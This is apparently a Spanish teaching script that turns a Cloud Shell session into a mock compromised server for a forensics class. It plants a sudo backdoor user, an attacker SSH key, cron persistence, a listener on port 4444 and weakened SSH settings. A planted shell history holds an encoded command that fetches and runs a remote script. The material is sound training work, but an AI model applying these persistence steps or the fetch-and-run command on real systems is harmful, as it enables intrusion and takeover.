#!/bin/bash
# Caso Novapay · Parte 2 · Prepara en ESTA terminal de práctica el servidor web-novapay
# tal como quedó después del acceso indebido del 24/11 (datos inventados para la clase).
# Qué hace: crea usuarios de ejemplo, deja rastros del atacante (un usuario, una clave SSH,
# una tarea programada, un servicio escuchando) y una configuración débil para corregir.
# No se conecta con ninguna IP del caso, no envía nada a internet ni reinicia SSH.
# Todo desaparece al reiniciar Cloud Shell.
# Uso: sudo bash preparar.sh
set -e
if [ "$(id -u)" -ne 0 ]; then echo "Ejecutalo con sudo: sudo bash preparar.sh"; exit 1; fi
# Por seguridad, la práctica solo se prepara en Google Cloud Shell y con el servicio cron detenido.
if [ ! -d /google/devshell ]; then echo "Esta práctica se prepara solo en Google Cloud Shell."; exit 1; fi
# (cron activo = no se prepara)
if pgrep -x cron >/dev/null 2>&1 || pgrep -x crond >/dev/null 2>&1; then echo "El servicio cron está activo: esta práctica no se prepara en este equipo."; exit 1; fi

# 1. Usuarios del equipo (los legítimos figuran en notas-servidor.txt)
for u in mlopez agarcia soporte; do
  id "$u" >/dev/null 2>&1 || useradd -m -s /bin/bash "$u"
done
# Las contraseñas se generan al azar y no se muestran: nadie las conoce.
clave() { head -c 24 /dev/urandom | base64 | tr -d '/+='; }
echo "soporte:$(clave)" | chpasswd
id backup >/dev/null 2>&1 || useradd -r -s /usr/sbin/nologin backup

# 2. Rastro del atacante: un usuario nuevo con permisos de administrador
id backups >/dev/null 2>&1 || useradd -m -s /bin/bash backups
echo "backups:$(clave)" | chpasswd
usermod -aG sudo backups

# 3. Rastro del atacante: una clave SSH agregada a la cuenta soporte
install -d -m 700 -o soporte -g soporte /home/soporte/.ssh
cat > /home/soporte/.ssh/authorized_keys <<'K'
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHzItwVTpywhuUhx3ZJ/n0VhqCshbB6ZVkrTGXXvMTG5 soporte@mesa-de-ayuda
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOCD39IcJL+KjXjZQCcDxvwzXYb48yZyemiH/iGpO7eE root@vps-45-140-192-242
K
chown soporte:soporte /home/soporte/.ssh/authorized_keys; chmod 600 /home/soporte/.ssh/authorized_keys

# 4. Rastro del atacante: una tarea programada cada 10 minutos que ejecuta un script suyo.
#    El script no se crea: la tarea apunta a un archivo que no existe y no se conecta a ningún lado.
cat > /etc/cron.d/novapay-update <<'C'
# actualizacion automatica
*/10 * * * * root /var/tmp/.np/u.sh >/dev/null 2>&1
C
chmod 644 /etc/cron.d/novapay-update

# 4b. Rastro del atacante: el historial de comandos de «backups».
#     La línea en base64 solo se muestra: decodificada dice qué hacía el script (no se ejecuta).
cat > /home/backups/.bash_history <<'H'
whoami
sudo -l
mkdir -p /var/tmp/.np
echo Y3VybCAtcyBodHRwOi8vNDUuMTQwLjE5Mi4yNDIveCB8IHNoCg== | base64 -d > /var/tmp/.np/u.sh
chmod +x /var/tmp/.np/u.sh
sudo nano /etc/cron.d/novapay-update
sudo nohup python3 -m http.server 4444 --directory /var/tmp/.np &
rm /var/tmp/.np/u.sh
exit
H
chown backups:backups /home/backups/.bash_history; chmod 600 /home/backups/.bash_history

# 5. Rastro del atacante: un programa escuchando en el puerto 4444
install -d -m 755 /var/tmp/.np
if ! ss -tln | grep -q ':4444 '; then
  setsid nohup python3 -m http.server 4444 --directory /var/tmp/.np >/dev/null 2>&1 < /dev/null &
fi

# 6. Configuración débil: SSH acepta contraseñas y el ingreso directo como root.
#    Solo se cambia el archivo: el servicio SSH no se reinicia, así que no cambia cómo funciona.
[ -e /etc/ssh/sshd_config.original ] || cp /etc/ssh/sshd_config /etc/ssh/sshd_config.original
sed -i -E 's/^#?PasswordAuthentication .*/PasswordAuthentication yes/; s/^#?PermitRootLogin .*/PermitRootLogin yes/' /etc/ssh/sshd_config

# 7. Configuración débil: el archivo con la contraseña de la base de datos lo puede leer cualquiera
install -d -m 755 /opt/novapay
cat > /opt/novapay/config.env <<'E'
# Configuración de la aplicación web de Novapay (datos inventados)
DB_HOST=10.20.5.10
DB_USER=novapay_app
DB_PASSWORD=Novapay2026!
E
chmod 644 /opt/novapay/config.env

# 8. Fechas del ataque (24/11, después del acceso de las 02:35:54), para la línea de tiempo
touch -d "2026-11-24 02:37" /home/backups
touch -d "2026-11-24 02:39" /home/soporte/.ssh/authorized_keys
touch -d "2026-11-24 02:41" /etc/cron.d/novapay-update
touch -d "2026-11-24 02:44" /home/backups/.bash_history /var/tmp/.np

sleep 1
echo
echo "Listo: el servidor web-novapay quedó como lo dejó el atacante."
echo "Seguí con el paso siguiente de la guía."
